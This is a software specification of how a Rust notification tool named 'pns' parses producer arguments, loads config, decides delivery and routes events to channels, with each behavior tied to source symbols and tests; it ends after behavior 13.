# Producer submission

## Scope

This document specifies the producer submission path: everything that happens between a producer stating
an event in argv (`pns --agent claude --state done ...`) and the delivery attempts that event earns. It
covers the single argv read at the composition root, the refusal of a word that names no command, the
lenient producer flag parser, the help arm, the config load and plugin selection, the one clock read, the
overrides the environment and the operator's own state contribute, the delivery decision, the legs that
fall out of it, the pane scrub, the rendered event handed to each channel, the dispatch precedence
between a compiled-in plugin and an executable channel, per-leg isolation, which delivery lines reach
stdout, and the records the first delivery writes. It does not cover the harness hook arms
(`pns hook <event>`), the moshi gate, or the modes that take no event (`pulse`, `quiet`, `doctor`,
`recap`, `daemon`, `lights`, `loop`, `nag`, `setup`, `home`); those reach `run_event` by other routes or
not at all. Every claim below cites the symbol or test that establishes it; anything a reader would
expect and that no evidence supports is written as a `NOT ESTABLISHED:` line.

Terms used here in the code's own sense: `decision ring` (the `decisions` state file), `journal` (the
`missed-notifications` state file), `unread` (the lamp the news record arms), `dim window` and
`quiet window` and `quiet hours` (the lights' own silences), `home probe` and `router` (the presence
sensor `pns home` reads).

## Behaviors

### 1. Argv is read once, lossily, and shared

Given a producer invocation whose argument vector may contain bytes that are not valid Unicode When
`main` starts Then argv (minus the program name) is collected once with `std::env::args_os()` and each
argument is converted with `to_string_lossy`, and that one vector is what the top-level dispatch, the
producer check and the event parse all read.

- Success: a single `Vec<String>` reaches `is_producer_argv` and `event_mode`; a non-Unicode byte
  degrades into a replacement character, which the parser then treats as an ordinary unknown token
  (`src/main.rs:main`).
- Failure sources: none reachable. `std::env::args()` would panic on a non-Unicode argument, which is why
  the `_os` form plus a lossy conversion is used (`src/main.rs:main`, comment at the top of the
  function).
- Fail direction: fail-open. "Open" here means the notification still runs: a stray byte becomes a token
  the lenient parser skips in silence rather than an abort on a path that must never fail the work it
  reports on.
- Thresholds: not applicable, no counted quantity is involved.
- Required side effects: none. This step reads the process environment only.
- Forbidden side effects: no second read of argv anywhere on the event path. Three separate readers used
  to call `std::env::args_os()` independently (`src/main.rs:main`); `second_argument` still reads argv
  directly, but only for the subcommand arms, never for a producer invocation.
- Timeout and cancellation: not applicable, no subprocess or IO.
- Idempotency and duplicates: not applicable, the read happens once per process.
- Privacy: argv content is not printed here. What survives into a durable record is restricted later (see
  behavior 17).
- Process ownership and cleanup: not applicable.
- Compatibility contract: `tests/dispatch.rs:a_non_unicode_argument_never_breaks_the_exit_zero_edge` runs
  the binary with the raw byte `0xff` as an argument plus both narrowing flags, and pins that stdout
  still contains `SKIPPED` and that the process exits 0 (`support::run` asserts `status.success()` on
  every call).

### 2. A word that names no command is refused, never delivered

Given argv whose tokens include no producer flag and no `--help`/`-h`, and whose leading word is not one
of the recognized subcommands When `main` reaches the producer check Then the whole `USAGE` text is
printed to stderr and the process exits 2, having loaded no config, spawned no probe and written no
state.

- Success: exit code 2, `USAGE` on stderr, empty stdout (`src/main.rs:main`,
  `src/main.rs:is_producer_argv`).
- Failure sources: a producer invocation misclassified as a typo would silently drop a real notification.
  The check reads the WHOLE of argv rather than its first word specifically to avoid that
  (`src/main.rs:is_producer_argv`).
- Fail direction: fail-closed for a word naming no command. The always-exit-0 contract governs EVENT
  deliveries, and a word that never becomes an event is refused rather than degraded (`src/main.rs:main`,
  comment above the `is_producer_argv` call).
- Thresholds: one step either side of the predicate. Argv carrying at least one token for which
  `pns::args::is_producer_flag` or `pns::args::is_help_flag` answers true is a producer invocation and
  delivers; argv carrying none of those, and not empty, is exit 2. An EMPTY argv is the bare invocation
  and delivers (behavior 6).
- Required side effects: none.
- Forbidden side effects: no config read, no probe spawn, no state directory creation, no delivery.
- Timeout and cancellation: not applicable.
- Idempotency and duplicates: not applicable.
- Privacy: the refused word is not echoed; only the fixed `USAGE` text is printed.
- Process ownership and cleanup: not applicable, nothing is spawned.
- Compatibility contract: exit code 2 and the substring `usage` on stderr are pinned by
  `tests/dispatch.rs:a_word_that_names_no_command_is_refused_and_delivers_nothing` (for `stpo` and
  `stpo --wat`), by `tests/dispatch.rs:a_dash_led_first_word_is_no_longer_a_free_pass_for_an_empty_event`
  (for `--wat`, `-`, `--`, `--help=x`, `--HELP`, `-help`, `--agent=claude`) and by
  `tests/dispatch.rs:a_typed_empty_word_is_refused_unlike_the_bare_invocation_beside_it` (for `pns ""`).
  The first two also assert `sandbox.spawned()` is empty, which is the observable proof that nothing on
  the event path ran.

### 3. Help in flag position prints the usage and reaches nothing

Given argv carrying `--help` or `-h` in flag position, wherever it sits When `event_mode` parses it Then
the `USAGE` text is printed to stdout and the function returns, before any config load, probe or
delivery.

- Success: exit 0, `USAGE` on stdout, stderr empty (`src/main.rs:event_mode`, first branch;
  `src/args.rs:parse_args`, the `is_help_flag` arm).
- Failure sources: a help spelling that reached the event path instead. That was the shipped defect: help
  fell through the parser as an unknown token and delivered a notification titled `pns · done`
  (`src/main.rs:event_mode` comment).
- Fail direction: fail-closed against delivery. Printing the commands needs no machine read, so nothing
  is read.
- Thresholds: not applicable.
- Required side effects: none.
- Forbidden side effects: no config load, no probe, no state file, no notification. The parse warnings
  loop sits BELOW the help branch, so a help invocation prints no warnings either
  (`src/main.rs:event_mode`).
- Timeout and cancellation: not applicable.
- Idempotency and duplicates: not applicable.
- Privacy: `USAGE` is a fixed compiled-in string; nothing from argv is echoed.
- Process ownership and cleanup: not applicable.
- Compatibility contract: `tests/dispatch.rs:the_help_flag_prints_the_usage_and_reaches_nothing_at_all`
  pins exit 0, `usage` on stdout, an EMPTY stderr, an empty spawn log and a state directory that does not
  exist, for both `--help` and `-h`.
  `tests/dispatch.rs:help_in_flag_position_wins_wherever_it_reaches_the_event_parser` pins the same for
  `--agent claude --help`, `--local-only --help`, `-- --help` and `stray --help`.
  `src/args.rs:tests::help_in_flag_position_is_recognized_wherever_it_sits` pins the parser half.

### 4. Producer flags are parsed leniently, and a recognized flag is never eaten

Given argv containing producer flags When `parse_args` walks it Then each value flag takes the next token
as its value unless that token is itself a recognized flag or there is no next token, in which case the
flag is warned about and left unconsumed; a bare flag sets its boolean; any other unknown token is
skipped in silence.

- Success: `--agent`, `--state`, `--project`, `--branch`, `--detail`, `--pane` and `--channel` land in
  their fields; `--long-running`, `--local-only` and `--remote-only` set their booleans
  (`src/args.rs:parse_args`, `src/args.rs:VALUE_FLAGS`, `src/args.rs:BARE_FLAGS`).
- Failure sources: a value flag swallowing a recognized flag. That was a real defect twice:
  `--pane --local-only` delivering an event the caller asked to keep local, and `--long-running` being
  handled but absent from the predicate so `--detail --long-running` ate the tier and put a flag name in
  the summary (`src/args.rs:BARE_FLAGS` comment).
- Fail direction: fail-open, warn and degrade, never abort. An unrecognized token in value position IS
  taken as the value, which is the leniency the bash deliberately retained (`src/args.rs` module doc,
  rule three).
- Thresholds: exactly two token classes are protected, `VALUE_FLAGS` (7 entries) and `BARE_FLAGS` (3
  entries), unioned by `is_producer_flag`. One step either side: `--agent --bogus` sets the agent to
  `--bogus` with no warning; `--agent --pane x` warns about `--agent`, leaves it empty, and `--pane`
  still takes `x`. `--help` is deliberately NOT in `is_producer_flag`, so `--agent --help` sets the agent
  to the literal string `--help` (`src/args.rs:tests::help_in_value_position_is_still_just_a_value`).
- Required side effects: one warning string per ignored flag, returned to the caller, which `event_mode`
  prints as `pns: {warning}` on stderr (`src/main.rs:event_mode`).
- Forbidden side effects: none; the parser is a pure function of argv.
- Timeout and cancellation: not applicable.
- Idempotency and duplicates: a repeated flag simply overwrites its field, last occurrence wins (the
  match arms assign unconditionally in `src/args.rs:parse_args`). No test pins that.
- Privacy: values are held verbatim at this stage; the restriction on what reaches a durable record is
  applied later (behavior 17).
- Process ownership and cleanup: not applicable.
- Compatibility contract: field assignment is pinned by
  `src/args.rs:tests::every_value_flag_lands_in_its_field`; the protection rule by
  `src/args.rs:tests::a_recognized_flag_is_never_consumed_as_a_value` and
  `src/args.rs:tests::the_long_running_flag_is_protected_from_being_eaten_like_every_other_one`; the
  trailing-flag rule by `src/args.rs:tests::a_trailing_value_flag_is_warned_and_ignored`; the leniency by
  `src/args.rs:tests::an_unrecognized_token_is_still_taken_as_a_value` and
  `src/args.rs:tests::unknown_arguments_are_skipped_in_silence`; the `--channel` route name by
  `src/args.rs:tests::the_channel_flag_names_a_route_and_is_protected_like_every_value_flag`. End to end,
  `tests/dispatch.rs:help_in_value_position_is_still_just_a_value` pins that a delivered event carries
  `agent` and `state` equal to the literal `--help`, and
  `tests/dispatch.rs:a_producer_invocation_led_by_a_stray_word_still_delivers` pins that a stray leading
  word does not stop a delivery. NOT ESTABLISHED: the exact stderr wording
  `pns: --detail given without a value; ignoring`. The string lives at `src/args.rs:parse_args`; the unit
  tests assert only `warnings[0].contains("--detail")`, and a grep of `tests/` for
  `given without a value` finds nothing, so no test pins the sentence itself.

### 5. `--channel` selects a hermes route by name, falling back loud-ward

Given a producer invocation carrying `--channel <route>` When `dispatch_legs` constructs the hermes
channel Then the endpoint is `PNS_HERMES_URL` if that variable is set and non-empty, else the default
route's final path segment replaced by `<route>`, else the default route, and an unusable route name is
complained about and replaced by the default.

- Success: `channel_url(DEFAULT_HERMES_URL, route)` returns `http://127.0.0.1:8644/webhooks/<route>` for
  a usable name (`src/main.rs:hermes_url_for`, `src/channels/hermes.rs:channel_url`,
  `src/channels/hermes.rs:DEFAULT_HERMES_URL`).
- Failure sources: a route name that cannot be a path segment. `safety::route_name_is_usable` accepts
  only non-empty runs of ASCII letters, digits, `-` and `_` (`src/safety.rs:route_name_is_usable`), and a
  base URL (uniform resource locator) with no `/` in it yields nothing
  (`src/channels/hermes.rs:tests::a_base_without_a_path_yields_nothing_rather_than_a_bogus_url`).
- Fail direction: fail-open, and the comment names the direction as LOUD-WARD: a misrouted notification
  on the default route beats a silently dropped one (`src/main.rs:hermes_url_for`).
- Thresholds: not applicable, this is a predicate rather than a count.
- Required side effects: on an unusable name, one stderr line:
  `pns: --channel "<name>" is not a usable route name; posting to the default route`
  (`src/main.rs:hermes_url_for`).
- Forbidden side effects: the route never reaches any channel but hermes; it is not a field of the
  rendered event (`src/main.rs:rendered_event` writes no channel field).
- Timeout and cancellation: the resulting URL is posted under hermes's own deadlines (behavior 13).
- Idempotency and duplicates: one URL is computed once per event.
- Privacy: the route name is echoed in the refusal line, quoted with `{:?}`. It is a caller-supplied
  identifier, not operator content.
- Process ownership and cleanup: not applicable.
- Compatibility contract:
  `src/channels/hermes.rs:channel_url_tests::a_route_name_swaps_the_default_urls_final_segment` pins the
  swap;
  `src/channels/hermes.rs:channel_url_tests::a_name_that_could_not_be_a_path_segment_is_refused_not_glued`
  pins the refusals. NOT ESTABLISHED: no test drives `--channel` through the binary. A grep of `tests/`
  for `--channel` returns nothing, so nothing pins that the producer flag reaches `hermes_url_for`, that
  the refusal line is printed, or that the chosen route appears on the wire. The analogous assignment for
  the home probe's stale alert IS covered
  (`tests/native.rs:the_stale_alert_posts_to_the_hermes_route_the_config_named`), and that test's own doc
  comment explains why only a native run can observe a route at all.

### 6. The bare invocation is a valid empty event

Given argv with no arguments at all When `main` runs Then `is_producer_argv` answers true on the empty
vector, `parse_args` returns `EventArgs::default()`, and an empty event is decided, rendered and
delivered.

- Success: the mobile and hermes legs fire against an away operator (`src/main.rs:is_producer_argv`,
  `src/args.rs:EventArgs` derives `Default`).
- Failure sources: a typo refusal that read "no argument" as "no command" would swallow this arm while
  looking exactly like the fix for behavior 2 (`src/main.rs:is_producer_argv` comment).
- Fail direction: fail-open. The empty event still delivers, and `render::title`/`render::message`
  substitute `pns`, `done` and `done` for the empty agent, state and body (`src/render.rs:title`,
  `src/render.rs:message`).
- Thresholds: zero arguments delivers; one argument that is the empty string is refused with exit 2
  (`tests/dispatch.rs:a_typed_empty_word_is_refused_unlike_the_bare_invocation_beside_it`).
- Required side effects: the same records every first delivery writes (behavior 18).
- Forbidden side effects: none specific.
- Timeout and cancellation: as for any event.
- Idempotency and duplicates: not applicable.
- Privacy: nothing to redact, every field is empty.
- Process ownership and cleanup: as for any event.
- Compatibility contract:
  `tests/dispatch.rs:a_bare_invocation_is_still_the_empty_event_the_contract_calls_valid` pins that both
  the mobile and hermes stub channels fire for `pns` with no arguments.

### 7. The config is loaded once and read for five things before selection consumes it

Given a producer event When `run_event` starts Then `load_config(&config_path(&home))` runs once, and
hue's settings table, the `[lights]` table, the `[plugins.mobile]` verdict, the hermes key, the `[recap]`
table and the `[focus] silence` list are read off that one outcome before `select_plugins` takes
ownership of it.

- Success: six values (`hue_table`, `lights`, `mobile`, `hermes_key`, `recap`, `focus_silence`) come out
  of one `match` over `&loaded` (`src/main.rs:run_event`).
- Failure sources: an absent config, an unreadable one, a malformed one, or one whose TOML (Tom's
  Obvious, Minimal Language) is invalid. `LoadOutcome::Missing` and `Err(_)` both fall to the same arm
  here.
- Fail direction: split deliberately, and the split is stated in the source. The five config-derived
  values fall back to DEFAULTS on a file nobody could read (no hue table, no lights map, default mobile,
  no hermes key, empty focus list) because "a file nobody could read asked for nothing"; the recap table
  is the one that falls back ON, because a config nobody can parse must not silently stop delivering
  misses; and plugin SELECTION falls back to the CORE rather than the defaults, so notifications keep
  working through a broken config (`src/main.rs:run_event`, the `_ =>` arm's comment).
- Thresholds: `registry::CORE` is exactly two names, `["mobile", "macos-banner"]`, in registration order
  (`src/registry.rs:CORE`). The full roster is five entries: `router` (a sensor), `mobile`,
  `macos-banner`, `hermes`, `hue` (`src/registry.rs:ROSTER`).
- Required side effects: when `select_plugins` returns a warning, `run_event` prints it to stderr
  verbatim (`src/main.rs:run_event`). The two wordings are
  `pns: config error ({detail}); running every built-in plugin` for a parsed config naming an
  unregistered plugin, and
  `pns: config error ({detail}); running the core plugins (mobile, macos-banner)` for a config nobody
  could read (`src/registry.rs:every_plugin_warning`, `src/registry.rs:core_warning`).
- Forbidden side effects: no second config read anywhere on the event path. The comment names the reason:
  the catch-up dispatches on the same two secrets, so the hermes key is CLONED rather than re-read
  (`src/main.rs:run_event`).
- Timeout and cancellation: not applicable, this is a file read.
- Idempotency and duplicates: one read per process.
- Privacy: the hermes key and the moshi token are read into memory and handed to their channels; neither
  is printed. The `pns: config error` lines carry a sanitized detail, not file contents
  (`src/registry.rs:core_warning` takes `error.detail()`).
- Process ownership and cleanup: not applicable.
- Compatibility contract: `tests/dispatch.rs:one_typod_table_name_costs_a_configured_machine_no_channel`
  pins that a parsed config naming `[plugins.hermess]` still fires mobile AND hermes, and that stderr
  carries both `unknown plugin \`hermess\``and`running every built-in
  plugin`. The core-fallback wording is pinned in the pulse mode by `tests/dispatch.rs:a_broken_config_says_so_in_pulse_mode_too_instead_of_dying_quietly`(substring`pns:
  config
  error`), and the absent-config silence by `tests/dispatch.rs:an_absent_config_stays_silent_in_pulse_mode`. NOT ESTABLISHED: no test in `tests/dispatch.rs`asserts the exact core-fallback sentence`running
  the core plugins (mobile, macos-banner)`on the EVENT path. I looked for`running the core`in`tests/\`;
  the only integration coverage of an unreadable config on the event path is the pulse-mode test above.

### 8. `[plugins.mobile]` is read exactly once, and its refusal travels with its token

Given a config carrying a `[plugins.mobile]` table When `read_mobile` runs Then one call to
`config::armed_mobile` decides all three answers: the push token, the refusal (when the table is enabled
and names a backend nothing compiled in answers), and the `mobile_watch_card` toggle.

- Success: a `Mobile { token, refusal: None, watch_card }` (`src/main.rs:read_mobile`,
  `src/main.rs:Mobile`).
- Failure sources: a `type` key that is absent, empty, or names anything but `moshi`
  (`src/channels/moshi.rs:mobile_backend`, `src/channels/moshi.rs:MOSHI_TYPE`); a `mobile_watch_card` of
  the wrong TOML type (`src/main.rs:watch_card`); a token key that is absent, of the wrong type, or
  empty, which is the not-set-up case rather than an error (`src/channels/moshi.rs:moshi_secret`).
- Fail direction: fail-closed and loud for a refused backend. The refusal both prints
  `pns: config error ({reason}); no card is pushed` at the composition root AND rides out on the `Mobile`
  value so `dispatch_legs` can fail the mobile leg with the same words wherever it would have been
  dispatched (`src/main.rs:read_mobile`, `src/main.rs:dispatch_legs`). A wrong-typed `mobile_watch_card`
  is fail-closed to `false` and loud (`src/main.rs:watch_card`). A missing token is fail-open at read
  time and becomes a `Delivery::Failed` at deliver time (behavior 13).
- Thresholds: exactly one compiled-in mobile backend, `"moshi"` (`src/channels/moshi.rs:MOSHI_TYPE`).
- Required side effects: the two stderr lines named above. A SWITCHED-OFF table with a bad `type` is
  deliberately NOT refused on the event path; that warning belongs to the diagnostic alone
  (`src/main.rs:disabled_backend_warning`, and `disabled_backend_warnings` has exactly one caller, inside
  `doctor_mode` at `src/main.rs:4206`).
- Forbidden side effects: no second read of the table. The comment names the defect that motivated it:
  the refusal was dropped on the way to a leg that then delivered anyway (`src/main.rs:run_event`, the
  destructuring comment).
- Timeout and cancellation: not applicable.
- Idempotency and duplicates: one read per event.
- Privacy: the token is never printed. `refused_backend_line` carries only the type name the operator
  wrote (`src/channels/moshi.rs:refused_backend_line`).
- Process ownership and cleanup: not applicable.
- Compatibility contract: `tests/dispatch.rs:a_watch_card_toggle_of_the_wrong_type_is_refused_out_loud`
  pins that stderr names `mobile_watch_card` and that the card stays off. The refused-backend line
  `mobile: FAILED, push SKIPPED -- no moshi token in the config ([plugins.mobile] token); nothing was sent`
  is pinned in the diagnostic by
  `tests/dispatch.rs:a_failure_on_the_first_channel_costs_no_later_leg_its_turn_and_still_exits_one` (the
  string at `tests/dispatch.rs:3239`), and
  `tests/dispatch.rs:a_mobile_table_naming_no_compiled_in_backend_pushes_no_card_through_either_seam`
  pins that the refusal reaches both seams. NOT ESTABLISHED: no test drives a refused mobile BACKEND
  through the producer event path and asserts the resulting leg verdict; the two tests above run the
  diagnostic (`pns doctor`), which shares the `dispatch_legs` gate but is a different entry point.

### 9. One wall clock read, and the mutes are stated by the composition root

Given a producer event When `run_event` assembles the overrides Then the clock is read once through the
probe set's memoized cell, `Overrides::from_env` parses the environment, and `muted` and `focus_active`
are overwritten with readings the composition root took itself.

- Success: `probes.now_secs()` answers from a `OnceCell`, so every age in the decision is measured
  against one moment (`src/system.rs:SystemProbes::now_secs`, `src/main.rs:run_event`). `overrides.muted`
  comes from `muted_now`, which reads the `quiet-until` state file (`src/main.rs:muted_now`), and
  `overrides.focus_active` from `focus_now`, which reads the macOS Do Not Disturb store under the
  operator's own `HOME` (`src/main.rs:focus_now`, `src/main.rs:FOCUS_DB`).
- Failure sources: an unreadable clock (`None`, which ages nothing rather than making a signal infinitely
  fresh); an unreadable Focus store, which `is_ok_and` reads as not silenced (`src/main.rs:run_event`); a
  garbled `PNS_IDLE_SECS`, `PNS_DESK_IDLE_SECS` or `PNS_PHONE_INPUT_AGE`, each of which sets its own
  `*_invalid` flag rather than falling back to a default (`src/engine.rs:Overrides::from_env`).
- Fail direction: fail-open toward delivering. An unreadable Focus store reads as not silenced; a garbled
  desk threshold makes NOTHING fresh, so the surface is `Away`, which always cards
  (`src/engine.rs:surface_reading`, the `desk_fresh_secs` guard).
- Thresholds: `DEFAULT_DESK_IDLE_SECS` is 120 seconds (`src/engine.rs:DEFAULT_DESK_IDLE_SECS`). A reading
  strictly LESS than the window is fresh; equal to it is not (`src/surface.rs:fresh_age` uses
  `*seconds < fresh_secs`). A count is valid only if it is all ASCII digits, has no leading zero unless
  it is a single character, and is at most `i64::MAX` (`src/lib.rs:parse_count`).
- Required side effects: none. Reading the mute and the Focus store writes nothing.
- Forbidden side effects: NO environment variable may set `muted` or `focus_active`. `from_env` leaves
  both false, and the field comments give the reason: a variable able to set it would let any producer
  mute the operator, and one able to clear it would end a mute they are still inside
  (`src/engine.rs:Overrides`, the `muted` and `focus_active` fields). There is also no environment hatch
  for the Focus store path; the test seam is the sandbox's own `HOME` (`src/main.rs:focus_now`).
- Timeout and cancellation: the Focus store is read through `readable_ring` under `RING_READ_MAX` (256
  KiB), so an oversized store is refused rather than slurped (`src/main.rs:focus_now`,
  `src/main.rs:RING_READ_MAX`).
- Idempotency and duplicates: `now_secs` is memoized, including a `None`, so the blocked path's earlier
  read and this one cannot disagree (`src/system.rs:SystemProbes::now_secs`).
- Privacy: the Focus mode identifier and the mute expiry stay in memory; the decision ring records only
  the two booleans (`src/decision_log.rs:line`, the `muted` and `focus` fields).
- Process ownership and cleanup: not applicable.
- Compatibility contract: the mute's effect end to end is pinned by
  `tests/dispatch.rs:a_muted_away_event_reaches_the_durable_log_alone_and_never_the_bridge`; the Focus
  half by
  `tests/dispatch.rs:an_event_raised_inside_a_focus_the_config_names_decorates_nothing_and_is_journaled`,
  `tests/dispatch.rs:an_event_raised_inside_a_focus_the_config_never_named_is_delivered_as_usual` and
  `tests/dispatch.rs:a_focus_store_that_cannot_be_read_costs_no_notification_at_all`.

### 10. Probes run only where their answer could change the verdict

Given overrides that already state an answer When `surface_reading` assembles its readings Then the probe
underneath a stated answer is never started and never read.

- Success: `probes.start(Wants { desk, phone })` is called once with exactly the two predicates the
  guards below consult, and a garbled desk threshold returns before any probe is started at all
  (`src/engine.rs:surface_reading`, `src/engine.rs:Overrides::reads_desk`,
  `src/engine.rs:Overrides::reads_phone`).
- Failure sources: a probe that hangs. Every probe runs under a runner deadline
  (`src/system.rs:SystemCommandRunner`). The screen-lock probe is read ONLY where the idle probe
  answered, because its only job is to disqualify what that probe reported, and the blocked path an
  approval waits on would otherwise pay that deadline serially (`src/engine.rs:surface_reading`).
- Fail direction: fail-open. Every reading is `Option`, `None` means "could not read" and never a value,
  and each decision states its own direction for it (`src/probes.rs` module doc). Only `Some(true)` locks
  the desk (`src/surface.rs:surface`).
- Thresholds: `PROBE_DEADLINE` is 5 seconds and `PROBE_READ_MAX` is 1 MiB per probe
  (`src/system.rs:PROBE_DEADLINE`, `src/system.rs:PROBE_READ_MAX`). One step either side: a probe that
  answers inside 5 seconds contributes its reading; one that does not is killed and reads as unknown.
- Required side effects: at most two background threads, one for the desk chain and one for the phone
  chain, joined by the first read that needs them (`src/system.rs`, `desk_handle` and `phone_handle`).
- Forbidden side effects: no probe may be read twice. Every reading is a `OnceCell`, including the ones
  that came back empty, "because an unreadable probe is an answer too" (`src/system.rs:SystemProbes`
  doc).
- Timeout and cancellation: `run_bounded` waits on a thread and kills the child when the window closes,
  because there is no wait-with-timeout in the standard library and macOS ships no `timeout(1)`
  (`src/system.rs:run_bounded`).
- Idempotency and duplicates:
  `src/system.rs:tests::starting_twice_and_reading_twice_spawns_each_probe_once` pins that a second
  `start` and a second read spawn nothing more.
- Privacy: probe output (a process list, a registry dump, a herdr layout) is parsed and discarded; none
  of it reaches a record.
- Process ownership and cleanup: each probe child is killed at its deadline by `run_bounded`.
- Compatibility contract: the guards are pinned by the recording probes in `src/engine.rs:tests`
  (`CountingProbes` counts every read and every `start` call). Nothing about probe timing is pinned by a
  wall-clock assertion in `tests/dispatch.rs`.

### 11. The delivery decision, and the order the overrides beat each other in

Given a surface reading, a session visibility reading and the caller's flags When `decide` runs Then
`surface::plan` produces a base plan, `skip_phone` beats `force_phone` beats the surface for the phone
card, and the two mutes are applied LAST, beating everything above them.

- Success: a `Decision { legs, plan, pane_dropped, inputs }` (`src/engine.rs:decide`,
  `src/engine.rs:Decision`).
- Failure sources: an unreadable session view, which becomes `Visibility::Unknown` and never suppresses
  (`src/engine.rs:operator_visibility`, `src/surface.rs:Visibility`).
- Fail direction: fail-open on doubt. "Open" means the notification is delivered: "a notification wrongly
  delivered costs a glance, a notification wrongly suppressed is the product failing silently"
  (`src/surface.rs:Visibility` doc). Hidden needs PROOF, a different tab or a zoom covering the pane
  (`src/surface.rs:visibility`).
- Thresholds: the arbitration is newest-signal-wins over three ages measured against one clock, with ties
  going to the desk (`src/surface.rs:surface`). The phone's two signals (the mosh client pty access time
  and the Back Tap marker) are collapsed with `min` before meeting the desk.
  `screen_locked == Some(true)` disqualifies the desk clock and nothing else. The `Mobile` plus
  not-`phone_input_fresh` case rewrites visibility to `Hidden`, because a Back Tap alone means no screen
  is in front of the operator (`src/surface.rs:effective_visibility`). The plan itself is three rules:
  `banner = Desk && !watching`; `phone_card` is false at the desk,
  `!watching || (long_running && mobile_watch_card)` on mobile, and always true when away;
  `pulse = long_running` (`src/surface.rs:plan`).
- Required side effects: none. `decide` is a pure function of its probes and arguments.
- Forbidden side effects: no probe may be read after `GateInputs` is assembled. "NOTHING BELOW THIS POINT
  touches a probe: one decision cannot be split across two readings that disagree"
  (`src/engine.rs:GateInputs` doc). The mute is an INPUT to the decision and never a filter over
  `decision.legs` afterwards (`src/main.rs:run_event`). The silenced branch is a FULL struct literal with
  no `..delivery`, so a future field of `DeliveryPlan` must state its own answer rather than inherit an
  unmuted one (`src/engine.rs:decide`).
- Timeout and cancellation: inherited from the probes (behavior 10).
- Idempotency and duplicates: one decision per event.
- Privacy: the pane's VALUE is never carried on `GateInputs`; only `pane_present` and the safety verdict
  are (`src/engine.rs:GateInputs`, the `pane_present` field).
- Process ownership and cleanup: not applicable.
- Compatibility contract: the matrix rows are pinned individually in `tests/dispatch.rs`:
  `away_from_the_desk_cards_the_phone_and_logs_but_raises_no_banner`,
  `at_the_desk_with_the_pane_out_of_sight_the_banner_is_the_whole_delivery`,
  `at_the_desk_watching_the_pane_only_the_log_fires`,
  `a_phone_in_hand_watching_the_pane_gets_nothing_but_the_log`,
  `a_phone_in_hand_showing_another_tab_still_cards`,
  `an_unreadable_view_delivers_rather_than_suppressing_on_doubt`,
  `at_the_desk_the_phone_is_skipped_and_only_the_phone`. The Back Tap rows are pinned by
  `a_back_tap_newer_than_the_last_desk_input_moves_the_operator_to_mobile`,
  `desk_input_after_the_tap_cancels_it` and
  `a_tap_with_moshi_closed_cards_the_phone_even_with_the_pane_in_plain_sight` (drill D6). The override
  order is pinned by `relay_skip_phone_drops_the_phone_and_only_the_phone`,
  `relay_skip_phone_beats_relay_force_phone`, `relay_force_phone_overrides_presence`,
  `force_phone_is_caller_intent_and_beats_the_whole_surface_model`, `skip_phone_still_beats_a_fresh_tap`
  and `a_narrowing_flag_still_beats_a_fresh_tap`.

### 12. Legs are computed from routing declarations, never from channel names

Given a vetted `Selection` and the arbitrated plan When `channel_plan` runs Then each selected CHANNEL
whose routing is `event_dispatched` survives the narrowing flags and the plan's own surface question, in
registration order, and each surviving leg carries its report mode and whether it is decorative.

- Success: an ordered `Vec<Leg>` (`src/routing.rs:channel_plan`, `src/routing.rs:Leg`).
- Failure sources: both narrowing flags together, which returns an empty vector immediately
  (`src/routing.rs:channel_plan`, first line).
- Fail direction: fail-closed for the contradiction, which the caller must then SAY, because a silent
  exit is indistinguishable from delivery (`src/main.rs:run_event`).
- Thresholds: `local_only` keeps only plugins declaring `local`; `remote_only` keeps only those declaring
  `durable` AND flips every leg's mode to `ReportOutcome`; neither flag keeps everything. A
  `presence_gated` plugin is dropped whenever `plan.phone_card` is false, under EVERY flag, so the gate
  means one thing everywhere (`src/routing.rs:channel_plan` doc). `decorative` is
  `presence_gated || local` (`src/routing.rs:channel_plan`).
- Required side effects: none, this is a pure function.
- Forbidden side effects: a `PluginKind::Sensor` can never become a leg. It carries no routing, so the
  property is unrepresentable rather than filtered (`src/registry.rs:PluginKind`). A plugin with
  `event_dispatched: false` (hue) registers so a typo in its name is still refused, but no notification
  ever routes to it (`src/registry.rs:ROSTER`).
- Timeout and cancellation: not applicable.
- Idempotency and duplicates: registration refuses a duplicate name outright
  (`src/registry.rs:register_plugin`), and `build_registry` PANICS on a refused registration, which is
  safe on an always-exit-0 path because the only reachable refusal is a duplicate in a compiled-in
  constant (`src/registry.rs:build_registry`).
- Privacy: leg names come out of the compiled roster, so nothing here can carry operator text or a
  newline (`src/decision_log.rs:verdicts`).
- Process ownership and cleanup: not applicable.
- Compatibility contract:
  `tests/dispatch.rs:local_only_keeps_the_banner_and_reaches_nothing_off_the_machine`,
  `tests/dispatch.rs:remote_only_delivers_through_hermes_alone`,
  `tests/dispatch.rs:hermes_is_sync_on_the_log_path_which_is_what_makes_an_undelivered_entry_visible`
  (which pins `sandbox.event("hermes")["mode"] == "sync"`) and
  `tests/dispatch.rs:the_alert_path_labels_the_hermes_leg_silent_on_the_wire` (which pins `"async"`). The
  wire words `async` and `sync` are the channel contract's own and must not change
  (`src/routing.rs:ReportMode::as_str`).

### 13. An empty plan says nothing, except for the contradiction the caller asked for

Given a decision whose `legs` is empty When `run_event` reaches the dispatch branch Then no channel is
constructed and nothing is dispatched, and exactly one line is printed, and only when the caller gave
both narrowing flags.

- Success: stdout carries
  `pns: post SKIPPED -- --local-only and --remote-only were both given, which suppresses every channel; nothing was sent`
  (`src/main.rs:run_event`).
- Failure sources: none, this is a branch rather than an operation.
- Fail direction: not applicable. The design point is that a verdict which must be SAID is said, because
  a silent exit is indistinguishable from delivery.
- Thresholds: exactly one condition prints. An empty plan reached any other way (muted with only
  decorative plugins selected, or a narrowing flag whose surface earned nothing) prints nothing
  (`src/main.rs:run_event`, the `if event.local_only && event.remote_only` guard).
- Required side effects: the decision ring still records the event with `legs=none` (behavior 17), and
  the journal still records the miss (behavior 18). "Nothing fired is exactly what an operator opens the
  report to ask about" (`src/main.rs:run_event`).
- Forbidden side effects: the pane-scrub warning must NOT be printed, because a scrub nobody was going to
  receive is not news. The warning lives inside `dispatch_legs`, which the empty branch never calls
  (`src/main.rs:dispatch_legs`).
- Timeout and cancellation: not applicable, nothing is spawned.
- Idempotency and duplicates: one line per event at most.
- Privacy: the line is a fixed string with no event content.
- Process ownership and cleanup: not applicable.
- Compatibility contract: the substring `SKIPPED` on stdout is pinned by
  `tests/dispatch.rs:both_narrowing_flags_together_deliver_nothing_and_say_so`, the substring
  `post SKIPPED` by
  `tests/dispatch.rs:an_event_that_reached_no_channel_at_all_still_records_its_decision`, and the absence
  of the scrub warning by `tests/dispatch.rs:a_scrub_warning_is_not_printed_when_no_channel_will_run`.
